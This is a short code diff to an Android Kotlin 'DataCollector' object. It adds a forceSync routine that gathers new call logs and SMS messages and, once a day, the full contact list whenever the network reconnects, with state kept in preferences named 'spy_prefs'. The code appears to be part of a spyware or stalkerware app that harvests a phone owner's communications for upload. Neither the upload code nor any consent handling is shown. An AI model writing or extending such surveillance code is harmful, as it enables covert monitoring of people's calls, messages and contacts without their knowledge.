@@ -30,6 +30,24 @@ object DataCollector {
         }, 0, 30, TimeUnit.SECONDS)
     }
 
+    // ✅ NEW: Force sync for network reconnection
+    fun forceSync(context: Context) {
+        executor.execute {
+            Log.d(TAG, "Force sync triggered")
+            collectNewCalls(context)
+            collectNewSms(context)
+            
+            // Force upload contacts periodically (once a day)
+            val prefs = context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
+            val lastContactSync = prefs.getLong("last_contact_sync", 0)
+            if (System.currentTimeMillis() - lastContactSync > 24 * 60 * 60 * 1000) {
+                collectAllContacts(context)
+                prefs.edit().putLong("last_contact_sync", System.currentTimeMillis()).apply()
+                Log.d(TAG, "Contacts sync triggered (daily)")
+            }
+        }
+    }
+
     // Helper to safely get column indices
     private fun getColumnIndexOrThrow(cursor: Cursor, columnName: String): Int {
         val idx = cursor.getColumnIndex(columnName)
